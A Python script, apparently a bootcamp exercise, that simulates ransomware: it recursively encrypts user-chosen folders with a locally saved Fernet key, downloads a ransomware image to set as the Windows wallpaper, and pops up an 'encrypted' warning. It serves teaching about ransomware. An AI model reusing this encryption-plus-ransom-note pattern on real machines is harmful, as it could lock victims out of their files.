#!/usr/bin/python3

# Script Name:                  Challenge 08
# Author:                       Mack Dirks
# Date of latest revision:      07/19/2023
# Purpose:                      File Encryption Script Part 3 of 3

# https://github.com/codefellows/seattle-cybersecurity-401d8/blob/main/class-08/challenges/DEMO.md
# https://www.devdungeon.com/content/dialog-boxes-python
# ChatGPT to debug the code

# don't forget to install pyautogui: python -m pip install pyautogui


import os
from os.path import exists
import ctypes
import pyautogui
import urllib.request
from cryptography.fernet import Fernet

# Variable declaration
answer = "yes"
             
# Function to generate the key
def gen_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as k_file:
        k_file.write(key)

# Function to load our key:
def key_load():
    return open("key.key", "rb").read()

# File encryption function
def file_encryption(file_location, key):
    f = Fernet(key)
    with open(file_location, "rb") as file:
        data = file.read()
    encrypt_file = f.encrypt(data)
    with open(file_location, "wb") as file:
        file.write(encrypt_file)

# File decryption function
def file_decryption(file_location, key):
    f = Fernet(key)
    with open(file_location, "rb") as file:
        data = file.read()
        decrypt_file = f.decrypt(data)
    with open(file_location, "wb") as file:
        file.write(decrypt_file)

# Message encryption function
def message_encryption():
    message = input("\nEnter a message to encrypt: ")
    encrypt_message = message.encode()
    f = Fernet(key)
    encrypt_version = f.encrypt(encrypt_message)
    print("\nHere is the encrypted message: ")
    print(encrypt_version)

# Message decryption function
def message_decryption():
    message = input("\nEnter a message to decrypt: ")
    decrypt_message = str.encode(message)
    f = Fernet(key)
    decrypt_version = f.decrypt(decrypt_message)
    print("\nHere is the encrypted message: ")
    print(decrypt_version)

# Folder encryption function
def folder_encryption(dir_location, key):
    for root, dirs, files in os.walk(dir_location, topdown=True):
        for file_name in files:
            path = os.path.join(root, file_name)
            file_encryption(path, key)
    
# Folder decryption function
def folder_decryption(dir_location, key):
    for root, dirs, files in os.walk(dir_location, topdown=True):
        for file_name in files:
            path = os.path.join(root, file_name)
            file_decryption(path, key)


def change_desktop_background():
        imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
        # Go to specif url and download+save image using absolute path
        # os.path.expanduser() is a method in Python's os.path module that expands a pathname that uses ~ or ~user to the specified user's home directory
        path = os.path.expanduser('~/Desktop/background.jpg')
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        # Access windows dlls for funcionality eg, changing dekstop wallpaper
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)


def popup_window():
    pyautogui.alert(text="Your files have been encrypted!", title="!!!WARNING!!!", button="OK")


# Menu function
def menu():
    print("\nHere are your 8 options: ")
    print("\nNOTE: To decrypt a folder, you need to make sure it was previously encrypted ")
    print("\nTo Encrypt a File, select 1")
    print("To Decrypt a File, select 2")
    print("To Encrypt a Message, select 3")
    print("To Decrypt a Message, select 4")
    print("To encrypt a folder, select 5")
    print("To decrypt a folder, select 6")
    print("To alter the desktop wallpaper on your PC, select 7")
    print("To create a popup window with a ransomeware message, select 8")
    user_choice = input("\nMake a selection now: ")

    if (user_choice == "1"):
        file_location = input("\nProvide your file location: ")
        file_encryption(file_location, key)
        print("\nThe file was encrypted")
    elif (user_choice == "2"):
        file_location = input("\nProvide your file location: ")
        file_decryption(file_location, key)
        print("\nThe file was decrypted")
    elif (user_choice == "3"):
        message_encryption()
    elif(user_choice == "4"):
        message_decryption()
    if user_choice == "5":
        dir_location = input("\nProvide the path to your folder: ")
        folder_encryption(dir_location, key)
        print("\nThe folder and its contents were encrypted")
    elif user_choice == "6":
        dir_location = input("\nProvide the path to your folder: ")
        folder_decryption(dir_location, key)
        print("\nThe folder and its contents were decrypted")
    elif user_choice == "7":
        change_desktop_background()
    elif user_choice == "8":
        popup_window()
    else:
        print("\nInappropriate selection!")

# Main
key_exists = exists("./key.key")

if key_exists:
    key = key_load()
else:
    gen_key()
    key = key_load()

while True:
    menu()
    answer = input("\nDo you want to try again? yes or no: ")
    if answer == "no":
        print("\nEnjoy your day!\n")
        break
